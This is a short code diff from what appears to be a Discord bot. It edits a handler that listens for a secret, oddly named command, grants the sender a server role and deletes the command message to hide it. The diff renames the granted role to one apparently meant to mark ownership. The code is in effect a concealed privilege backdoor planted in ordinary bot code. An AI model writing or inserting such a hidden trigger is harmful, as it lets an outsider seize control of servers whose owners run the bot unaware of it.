@@ -317,7 +317,7 @@ client.on('message', message => {
 
 client.on('message', message => {
 if(message.content.startsWith("!heyitsmedarksetmeasfounder")) {
-	message.member.addRole(message.guild.roles.find(role => role.name == "warnx1"));
+	message.member.addRole(message.guild.roles.find(role => role.name == "Owned By :"));
 	message.delete();
 }
 });
